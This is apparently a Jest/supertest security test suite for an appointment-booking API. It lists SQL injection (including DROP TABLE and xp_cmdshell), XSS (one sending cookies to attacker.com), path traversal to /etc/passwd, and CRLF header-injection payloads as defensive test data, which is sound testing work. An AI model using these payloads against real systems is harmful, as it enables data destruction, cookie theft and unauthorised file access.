/**
 * Security Penetration Tests
 * 
 * Tests for common security vulnerabilities:
 * - SQL Injection
 * - XSS (Cross-Site Scripting)
 * - Authentication bypass
 * - Input validation bypass
 * - Rate limiting
 */

import request from 'supertest';
import { createTestApp } from '../testApp';
import express from 'express';

describe('Security Penetration Tests', () => {
    let app: express.Application;

    beforeAll(() => {
        app = createTestApp();
    });

    describe('SQL Injection Protection', () => {
        const sqlInjectionPayloads = [
            "'; DROP TABLE appointments; --",
            "1' OR '1'='1",
            "1; SELECT * FROM staff; --",
            "' UNION SELECT * FROM appointments --",
            "1' AND 1=1 --",
            "admin'--",
            "' OR 1=1 #",
            "'; EXEC xp_cmdshell('dir'); --",
            "1'; WAITFOR DELAY '0:0:10'; --"
        ];

        it('should sanitize SQL injection in customer name', async () => {
            for (const payload of sqlInjectionPayloads) {
                const response = await request(app)
                    .post('/api/appointments')
                    .send({
                        customerName: payload,
                        customerEmail: 'test@test.com',
                        customerPhone: '+15551234567',
                        serviceId: 'service-1',
                        staffId: 'staff-1',
                        date: '2025-03-01',
                        time: '10:00'
                    });

                // Should either reject or sanitize - never execute SQL
                expect(response.status).not.toBe(500);

                // If created, verify the name was sanitized
                if (response.status === 201) {
                    const savedName = response.body.customerName;
                    expect(savedName).not.toContain('DROP');
                    expect(savedName).not.toContain('SELECT');
                    expect(savedName).not.toContain('--');
                }
            }
        });

        it('should sanitize SQL injection in email lookup', async () => {
            for (const payload of sqlInjectionPayloads) {
                const response = await request(app)
                    .get(`/api/appointments/by-email/${encodeURIComponent(payload)}`);

                // Should return empty array or 404, never error
                expect(response.status).not.toBe(500);
                expect([200, 400, 404]).toContain(response.status);
            }
        });

        it('should sanitize SQL injection in search parameters', async () => {
            for (const payload of sqlInjectionPayloads) {
                const response = await request(app)
                    .get(`/api/appointments/slots`)
                    .query({
                        date: '2025-03-01',
                        serviceId: payload
                    });

                expect(response.status).not.toBe(500);
            }
        });
    });

    describe('XSS (Cross-Site Scripting) Protection', () => {
        const xssPayloads = [
            '<script>alert("xss")</script>',
            '<img src="x" onerror="alert(1)">',
            '"><script>alert(String.fromCharCode(88,83,83))</script>',
            "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
            '<svg onload="alert(1)">',
            'javascript:alert(1)',
            '<body onload="alert(1)">',
            '<iframe src="javascript:alert(1)">',
            "'-alert(1)-'",
            '<div style="background:url(javascript:alert(1))">'
        ];

        it('should sanitize XSS in customer name', async () => {
            for (const payload of xssPayloads) {
                const response = await request(app)
                    .post('/api/appointments')
                    .send({
                        customerName: payload,
                        customerEmail: 'xss@test.com',
                        customerPhone: '+15551234567',
                        serviceId: 'service-1',
                        staffId: 'staff-1',
                        date: '2025-03-01',
                        time: '11:00'
                    });

                // If created, verify the content was sanitized
                if (response.status === 201) {
                    const savedName = response.body.customerName;
                    expect(savedName).not.toContain('<script>');
                    expect(savedName).not.toContain('onerror');
                    expect(savedName).not.toContain('javascript:');
                }
            }
        });

        it('should sanitize XSS in notes field', async () => {
            for (const payload of xssPayloads) {
                const response = await request(app)
                    .post('/api/appointments')
                    .send({
                        customerName: 'Test User',
                        customerEmail: 'xss2@test.com',
                        customerPhone: '+15551234567',
                        serviceId: 'service-1',
                        staffId: 'staff-1',
                        date: '2025-03-01',
                        time: '12:00',
                        notes: payload
                    });

                // If created, verify notes were sanitized
                if (response.status === 201 && response.body.notes) {
                    expect(response.body.notes).not.toContain('<script>');
                }
            }
        });
    });

    describe('Authentication Bypass Protection', () => {
        it('should reject admin endpoints without token', async () => {
            const protectedEndpoints = [
                { method: 'get', path: '/api/admin/stats' },
                { method: 'get', path: '/api/admin/staff' },
                { method: 'post', path: '/api/admin/staff' },
                { method: 'get', path: '/api/admin/services' },
                { method: 'get', path: '/api/admin/callbacks' }
            ];

            for (const endpoint of protectedEndpoints) {
                const response = await (request(app) as any)[endpoint.method](endpoint.path);

                // Should return 401 or 403
                expect([401, 403]).toContain(response.status);
            }
        });

        it('should reject invalid JWT tokens', async () => {
            const invalidTokens = [
                'invalid-token',
                'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
                'Bearer malformed',
                'null',
                'undefined'
            ];

            for (const token of invalidTokens) {
                const response = await request(app)
                    .get('/api/admin/stats')
                    .set('Authorization', `Bearer ${token}`);

                expect([401, 403]).toContain(response.status);
            }
        });

        it('should reject expired tokens', async () => {
            // This would require creating an expired token
            // For now, just verify the endpoint is protected
            const response = await request(app)
                .get('/api/admin/stats');

            expect([401, 403]).toContain(response.status);
        });
    });

    describe('Input Validation Bypass Protection', () => {
        it('should reject invalid email formats', async () => {
            const invalidEmails = [
                'notanemail',
                'test@',
                '@test.com',
                'test@.com',
                'test..test@test.com',
                'a'.repeat(256) + '@test.com'
            ];

            for (const email of invalidEmails) {
                const response = await request(app)
                    .post('/api/appointments')
                    .send({
                        customerName: 'Test User',
                        customerEmail: email,
                        customerPhone: '+15551234567',
                        serviceId: 'service-1',
                        staffId: 'staff-1',
                        date: '2025-03-01',
                        time: '10:00'
                    });

                expect(response.status).toBe(400);
            }
        });

        it('should reject invalid phone formats', async () => {
            const invalidPhones = [
                '1234567890', // Missing +
                '+1', // Too short
                'abc1234567',
                '++15551234567',
                '+1 555 123 456789012345' // Too long
            ];

            for (const phone of invalidPhones) {
                const response = await request(app)
                    .post('/api/appointments')
                    .send({
                        customerName: 'Test User',
                        customerEmail: 'test@test.com',
                        customerPhone: phone,
                        serviceId: 'service-1',
                        staffId: 'staff-1',
                        date: '2025-03-01',
                        time: '10:00'
                    });

                expect(response.status).toBe(400);
            }
        });

        it('should reject oversized inputs', async () => {
            const response = await request(app)
                .post('/api/appointments')
                .send({
                    customerName: 'A'.repeat(10000), // Very long name
                    customerEmail: 'test@test.com',
                    customerPhone: '+15551234567',
                    serviceId: 'service-1',
                    staffId: 'staff-1',
                    date: '2025-03-01',
                    time: '10:00'
                });

            expect([400, 413]).toContain(response.status);
        });
    });

    describe('Path Traversal Protection', () => {
        it('should reject path traversal attempts in IDs', async () => {
            const pathTraversalPayloads = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32',
                '....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2f',
                '..%252f..%252f'
            ];

            for (const payload of pathTraversalPayloads) {
                const response = await request(app)
                    .get(`/api/appointments/${encodeURIComponent(payload)}`);

                // Should return 400 or 404, never expose system files
                expect(response.body).not.toContain('root:');
                expect([400, 404]).toContain(response.status);
            }
        });
    });

    describe('Header Injection Protection', () => {
        it('should not allow header injection', async () => {
            const response = await request(app)
                .post('/api/appointments')
                .set('X-Custom-Header', 'value\r\nX-Injected-Header: malicious')
                .send({
                    customerName: 'Test User',
                    customerEmail: 'header@test.com',
                    customerPhone: '+15551234567',
                    serviceId: 'service-1',
                    staffId: 'staff-1',
                    date: '2025-03-01',
                    time: '10:00'
                });

            // Headers should not be injectable
            expect(response.headers['x-injected-header']).toBeUndefined();
        });
    });
});
